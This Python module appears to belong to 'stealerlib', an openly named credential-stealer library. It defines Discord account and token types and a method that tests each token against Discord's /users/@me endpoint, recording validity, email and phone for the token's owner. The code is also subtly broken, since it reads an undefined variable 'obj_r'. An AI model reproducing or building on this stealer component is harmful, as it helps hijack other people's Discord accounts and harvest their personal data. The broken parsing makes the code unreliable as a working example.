# -*- coding: utf-8 -*-
"""
    @author:  codeuk
    @package: stealerlib/apps/discord/types.py
"""

from stealerlib.apps.discord import *
from stealerlib.request import HTTPHandler

DiscordAPI = HTTPHandler(base="https://discord.com/api/v9/")


class DiscordTypes:

    @dataclass
    class Account:
        valid: bool
        token: str
        id: str=None
        username: str=None
        discriminator: str=None
        email: str=None
        phone: str=None

        def conv(self) -> list:
            return [
                self.valid,
                self.id,
                self.token,
                self.username,
                self.discriminator,
                self.email,
                self.phone
            ]

    @dataclass
    class Token:
        token: str

        def get_information(self):
            resp = DiscordAPI.get(
                endpoint="/users/@me",
                headers={'Authorization': self.token}
            )

            if resp.status_code == 200:
                new_account = DiscordTypes.Account(
                    valid=True,
                    token=self.token,
                    id=obj_r['id'],
                    username=obj_r['username'],
                    discriminator=obj_r['discriminator'],
                    email=obj_r['email'],
                    phone=obj_r['phone'],
                )
            else:
                new_account = DiscordTypes.Account(
                    valid=False,
                    token=self.token
                )

            return new_account

        def conv(self) -> list:
            return self.token
